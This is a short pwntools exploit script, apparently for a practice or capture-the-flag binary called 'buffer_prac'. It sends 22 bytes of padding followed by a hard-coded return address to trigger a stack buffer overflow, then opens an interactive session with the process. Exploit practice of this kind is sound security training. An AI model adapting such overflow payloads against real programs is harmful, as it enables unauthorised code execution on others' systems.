from pwn import *

p = process("./buffer_prac")
p.recv()
p.sendline(str(1))
print(p.recv())
p.sendline("A" * 22 + "\x26\x86\x04\x08")
print(p.recvline())
p.interactive()

